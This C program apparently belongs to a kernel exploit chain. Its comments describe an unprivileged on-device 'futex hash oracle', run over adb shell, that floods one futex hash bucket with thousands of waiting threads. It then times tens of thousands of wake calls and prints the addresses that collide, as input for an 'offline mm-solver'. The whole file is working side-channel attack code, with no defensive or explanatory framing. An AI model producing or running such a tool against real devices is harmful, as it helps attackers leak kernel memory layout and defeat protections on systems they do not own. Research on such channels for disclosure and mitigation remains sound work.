/* On-device futex hash oracle: pile one bucket, time 32K probes, print the
 * slow (same-bucket) addresses. Run via adb shell; no privileges needed.
 * Output feeds the offline mm-solver. */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <pthread.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <sys/time.h>
#include <unistd.h>
#include <fcntl.h>

#define FUTEX_WAIT_PRIVATE 128
#define FUTEX_WAKE_PRIVATE 129
#define NPROBES 32768
#define NPAGES 4096
#define PILE 4096
#define PAGE 4096

static inline int futex(uint32_t *uaddr, int op, uint32_t val) {
  return syscall(SYS_futex, uaddr, op, val, NULL, NULL, 0);
}

static uint32_t *pile_word;
static volatile int go;

static void *waiter(void *arg) {
  (void)arg;
  while (!go) sched_yield();
  futex(pile_word, FUTEX_WAIT_PRIVATE, 0);
  return NULL;
}

static uint64_t now(void) {
  struct timeval tv;
  gettimeofday(&tv, NULL);
  return (uint64_t)tv.tv_sec * 1000000 + tv.tv_usec;
}

int main(void) {
  /* pile word + probe pages, all in one mapping, page-distinct probes */
  uint32_t *probe[NPROBES];
  char *reg = mmap(NULL, (NPAGES + 1) * PAGE, PROT_READ | PROT_WRITE,
                   MAP_ANON | MAP_PRIVATE, -1, 0);
  if (reg == MAP_FAILED) { perror("mmap"); return 1; }
  pile_word = (uint32_t *)(reg + 8);  /* page 0, offset 8 */
  for (size_t i = 0; i < NPROBES; i++) {
    size_t page = 1 + (i % NPAGES);
    size_t off = 16 * (i / NPAGES) + 16;
    probe[i] = (uint32_t *)(reg + page * PAGE + off);
  }

  /* baseline: pile not started yet */
  uint64_t t0 = now();
  futex(probe[0], FUTEX_WAKE_PRIVATE, 0);
  uint64_t base = now() - t0;
  fprintf(stderr, "baseline_us=%llu\n", (unsigned long long)base);

  pthread_t tids[PILE];
  for (size_t i = 0; i < PILE; i++) {
    if (pthread_create(&tids[i], NULL, waiter, NULL)) { perror("pthread"); return 1; }
  }
  /* let them all block */
  usleep(500000);
  go = 1;
  usleep(100000);

  uint64_t t_med = 0;
  static uint64_t times[NPROBES];
  for (size_t i = 0; i < NPROBES; i++) {
    uint64_t t0 = now();
    futex(probe[i], FUTEX_WAKE_PRIVATE, 0);
    times[i] = now() - t0;
  }
  /* median */
  static uint64_t sorted[NPROBES];
  memcpy(sorted, times, sizeof(times));
  for (size_t i = 1; i < NPROBES; i++) {
    uint64_t v = sorted[i];
    size_t j = i;
    while (j && sorted[j - 1] > v) { sorted[j] = sorted[j - 1]; j--; }
    sorted[j] = v;
  }
  t_med = sorted[NPROBES / 2];
  uint64_t thr = t_med * 20 + 100;

  fprintf(stderr, "pile_word=%p median_us=%llu thr_us=%llu\n",
          (void *)pile_word, (unsigned long long)t_med,
          (unsigned long long)thr);
  size_t nslow = 0;
  for (size_t i = 0; i < NPROBES; i++) {
    if (times[i] > thr) {
      printf("SLOW %p %llu\n", (void *)probe[i], (unsigned long long)times[i]);
      nslow++;
    }
  }
  fprintf(stderr, "slow=%zu nprobes=%d\n", nslow, NPROBES);

  futex(pile_word, FUTEX_WAKE_PRIVATE, PILE + 16);
  usleep(100000);
  return 0;
}
